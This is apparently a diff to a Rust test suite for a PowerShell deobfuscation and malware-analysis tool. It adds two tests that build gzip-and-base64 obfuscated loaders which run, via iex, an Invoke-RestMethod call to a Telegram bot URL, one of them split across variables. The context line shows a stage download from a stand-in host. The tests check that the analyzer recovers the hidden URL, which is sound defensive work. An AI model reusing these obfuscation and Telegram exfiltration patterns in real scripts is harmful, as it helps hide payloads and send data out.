@@ -24946,6 +24946,63 @@ Lower 'INVOKE-WEBREQUEST -URI HTTPS://PS-LOWER-EXTRACTOR.EXAMPLE/STAGE.PS1'"#;
     }
 
     #[test]
+    fn ps1_variable_gzip_streamreader_recurses_into_download_trait() {
+        use base64::Engine;
+        use std::io::Write;
+
+        let decoded =
+            "Invoke-RestMethod -Uri 'https://api.telegram.org/bot123:abc/sendMessage?chat_id=777'";
+        let mut encoder = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
+        encoder.write_all(decoded.as_bytes()).unwrap();
+        let gz = encoder.finish().unwrap();
+        let b64 = base64::engine::general_purpose::STANDARD.encode(gz);
+        let ps = format!(
+            "$c='{b64}';$ms=New-Object IO.MemoryStream(,[Convert]::FromBase64String($c));$gz=New-Object IO.Compression.GZipStream($ms,[IO.Compression.CompressionMode]::Decompress);$sr=New-Object IO.StreamReader($gz);iex($sr.ReadToEnd());"
+        );
+        let report = analyze(ps.as_bytes(), &Config::default());
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. }
+                    if src.contains("api.telegram.org/bot123:abc/sendMessage?chat_id=777")
+            )),
+            "decoded GZipStream payload did not emit Telegram URL: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_split_variable_gzip_streamreader_recurses_into_download_trait() {
+        use base64::Engine;
+        use std::io::Write;
+
+        let decoded =
+            "Invoke-RestMethod -Uri 'https://api.telegram.org/bot321:xyz/sendMessage?chat_id=999'";
+        let mut encoder = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
+        encoder.write_all(decoded.as_bytes()).unwrap();
+        let gz = encoder.finish().unwrap();
+        let b64 = base64::engine::general_purpose::STANDARD.encode(gz);
+        let split = b64.len() / 2;
+        let ps = format!(
+            "$p1='{}';$p2='{}';$d=$p1+$p2;$ms=New-Object IO.MemoryStream(,[Convert]::FromBase64String($d));$gz=New-Object IO.Compression.GZipStream($ms,[IO.Compression.CompressionMode]::Decompress);$sr=New-Object IO.StreamReader($gz);iex($sr.ReadToEnd());",
+            &b64[..split],
+            &b64[split..]
+        );
+        let report = analyze(ps.as_bytes(), &Config::default());
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. }
+                    if src.contains("api.telegram.org/bot321:xyz/sendMessage?chat_id=999")
+            )),
+            "split variable GZipStream payload did not emit Telegram URL: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
     fn ps1_normalization_decodes_nested_deflate_base64() {
         use base64::Engine;
         use std::io::Write;
